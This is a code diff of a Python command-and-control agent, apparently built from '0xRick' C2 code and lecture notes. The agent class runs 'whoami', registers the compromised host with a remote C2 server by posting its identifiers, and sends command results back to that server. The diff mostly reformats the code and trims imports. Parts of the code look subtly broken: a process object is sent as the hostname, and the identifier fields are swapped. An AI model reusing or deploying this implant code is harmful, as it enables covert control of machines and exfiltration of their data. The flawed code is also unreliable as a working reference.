@@ -1,12 +1,9 @@
 #refrenced 0xRick c2 code, lecture notes and code
 import time
-import os, sys
-import random, string
-import requests 
+import os
+import random
 import subprocess
-import time
-from flask import Flask, request
-
+import requests
 
 class agents():
     """被控端表"""
@@ -62,19 +59,22 @@ class agents():
         self.whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
         self.output += self.result.stdout.read().decode()
         #add info to database
-        r = requests.post(f"{self.server}{self.register_path}", json={"guid":self.agent_id, "hostname":self.whoami, "computername":self.username})
+        r = requests.post(f"{self.server}{self.register_path}",
+                          json={"guid": self.agent_id,
+                                "hostname": self.whoami,
+                                "computername": self.username})
         if r.status_code ==200:
             if r.text == "OK":
                 print("reigstered!")
-                return True 
-        return False 
+                return True
+        return False
     
     def send_response(self, results):
         r = requests.post(f"{self.server}{self.response_path}", data=results)
         if r.status_code ==200:
             if r.text == "OK":
                 print("response returned!")
-                return True 
+                return True
         else:
             return False
         
